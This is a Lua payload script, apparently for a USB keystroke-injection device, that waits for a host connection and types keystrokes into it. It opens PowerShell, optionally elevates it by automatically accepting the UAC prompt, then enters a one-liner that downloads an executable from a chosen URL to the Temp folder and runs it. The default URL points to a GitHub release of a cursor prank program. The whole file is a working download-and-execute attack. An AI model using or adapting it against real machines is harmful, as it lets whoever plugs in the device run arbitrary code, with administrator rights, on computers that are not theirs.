---
--- Created by netdex.
--- DateTime: 12/30/17 10:12 PM
---
--- downloadrun.lua: downloads and executes a file
--- directly translated from the Java version in previous builds
---

local file = ask("File to download?", "https://github.com/Netdex/FlyingCursors/releases/download/1.0.0/FlyingCursors.exe")
local runAs = should("Task UAC", "Launch exe as admin?");

while not cancelled() do
    log("idle")

    -- poll until /dev/hidg0 is writable
    while not cancelled() and not test() do delay(1000) end
    if cancelled() then break end

    log("running")
    delay(1000)

    log("opening powershell, runAs=" .. tostring(runAs))
    if runAs then
        -- when running elevated prompt sometimes it pops in background, so we need
        -- to go to the desktop
        press_keys(kb.LSUPER, kb.D)
        delay(500)
        press_keys(kb.LSUPER, kb.R)
        delay(2000)
        send_string("powershell Start-Process powershell -Verb runAs\n")
        delay(3000)
        press_keys(kb.LALT, kb.Y)
        delay(2000)
    else
        press_keys(kb.LSUPER, kb.R)
        delay(2000)
        send_string("powershell\n")
        delay(2000)
    end

    log("download + execute code")

    send_string(
    "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
    "$u='" .. file .. "';" ..
    "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
    "$e=New-Object -com shell.application;" ..
    "$e.shellexecute($f);" ..
    "exit;\n"
    )

    log("done")
    while not cancelled() and test() do
        delay(1000)
    end
    log("disconnected")
end

